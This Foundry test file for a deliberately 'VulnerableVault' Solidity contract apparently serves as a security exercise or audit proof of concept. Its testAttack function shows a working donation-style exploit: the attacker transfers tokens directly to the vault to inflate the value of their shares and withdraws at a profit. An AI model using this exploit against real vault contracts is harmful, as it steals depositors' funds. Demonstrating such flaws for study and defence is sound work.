// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {VaultToken} from "../src/VaultToken.sol";
import {VulnerableVault} from "../src/Vault.sol";

contract VaultTest is Test {
    VaultToken vtoken;
    VulnerableVault vault;
    address owner;
    address user;
    address attacker;

    function setUp() public {
        owner = address(this);
        user = address(0x1);
        attacker = address(0x2);

        // Create the VTK token
        vtoken = new VaultToken();
        assertTrue(address(vtoken) != address(0));

        // Create the vault
        vault = new VulnerableVault(address(vtoken), owner);
        assertTrue(address(vault) != address(0));

        // As the owner, mint and deposit the first 100 tokens to the vault
        vm.startPrank(owner);
        vtoken.mint(owner, 100);
        vtoken.approve(address(vault), 100);
        vault.deposit(100);
        vm.stopPrank();
    }

    function testNormalUse() public {
        uint16 userStartTokens = 10000;
        uint8 userInvestment = 10;

        // Mint tokens for the user
        vtoken.mint(user, userStartTokens);
        console2.log("User starts with %d vtokens", userStartTokens);

        // User deposits tokens to the vault
        console2.log("-------------------------");
        console2.log("User deposits %d tokens", userInvestment);
        vm.startPrank(user);
        vtoken.approve(address(vault), userInvestment);
        vault.deposit(userInvestment);

        // Half a year passes
        uint32 halfYear = 183 * 24 * 60 * 60;
        skip(halfYear);
        console2.log("[time] Half a year later");

        // User withdraws all of its shares
        console2.log("-------------------------");
        console2.log("User withdrew all of its shares");
        vault.withdraw(vault.balanceOf(user));
        vm.stopPrank();

        uint256 userFinalBalance = vtoken.balanceOf(user);
        console2.log("-------------------------");

        uint256 userYield = userFinalBalance - userInvestment - userStartTokens;
        console2.log("User had gained %d in yield", userYield);
        assertTrue(userYield > 0, "User did not gain yields.");
    }

    function testAttack() public {
        uint16 attackerStartTokens = 10000;

        // direct transfer of 30 tokens on intial investment of 10.. tokens triggers the exploitation
        uint8 attackerInitialInvestment = 10;
        uint8 attackerDirectTransferAmount = 30;

        // Mint vtokens for the attacker
        vtoken.mint(attacker, attackerStartTokens);
        console2.log("Attacker starts with %d vtokens", attackerStartTokens);

        // Attacker deposits 10 tokens to aquire shares
        vm.startPrank(attacker);
        vtoken.approve(address(vault), attackerInitialInvestment);
        vault.deposit(attackerInitialInvestment);
        console2.log("-------------------------");
        console2.log(
            "Attacker deposited %d vtokens",
            attackerInitialInvestment
        );

        // Attacker waits half a year
        uint32 halfYear = 183 * 24 * 60 * 60;
        skip(halfYear);
        console2.log("[time] Half a year later");

        uint256 attackerPreTransferYield = vault.calculateYield(attacker) -
            attackerInitialInvestment;
        console2.log(
            "If attacker pulls out now, its yield is %d VTK",
            attackerPreTransferYield
        );

        logVaultState();

        // Attacker directly transfers tokens to the vault's balance, not increasing totalSupply
        vtoken.approve(address(vault), attackerDirectTransferAmount);
        vtoken.transfer(address(vault), attackerDirectTransferAmount);
        console2.log("-------------------------");
        console2.log(
            "Attacker transfered %d vtokens directly",
            attackerDirectTransferAmount
        );

        uint256 attackerPostTransferYield = vault.calculateYield(attacker) -
            attackerInitialInvestment;
        console2.log(
            "If attacker pulls out now, its yield is %d BVT",
            attackerPostTransferYield
        );

        // Total vault balance is now increased, but total share supply hasn't updated accordingly
        logVaultState();

        // Attacker withdraws using their shares, which should now be worth significantly more
        console2.log("-------------------------");
        console2.log("Attacker withdrew all of its shares");
        uint256 attackerShares = vault.balanceOf(attacker);
        vault.withdraw(attackerShares);
        vm.stopPrank();

        logVaultState();

        // Verify attacker's final balance to confirm the profit
        uint256 attackerFinalBalance = vtoken.balanceOf(attacker);
        console2.log("Attacker's vtokens count: %d", attackerFinalBalance);

        // attacker had to spend attackerDirectTransferAmount
        // attacker gained attackerPostTransferYield - attackerPreTransferYield more yield
        console2.log(
            "Attacker had to spend %d tokens, but gained %d extra tokens",
            attackerDirectTransferAmount,
            attackerPostTransferYield - attackerPreTransferYield
        );

        assertTrue(
            attackerDirectTransferAmount <
                (attackerPostTransferYield - attackerPreTransferYield),
            "Attack did not profit from the direct transfer"
        );
    }

    function logVaultState() internal view {
        console2.log("Vault's totaly supply is %d", vault.totalSupply());
        console2.log("Vault's total balance is %d", vault.getVaultBalance());
    }
}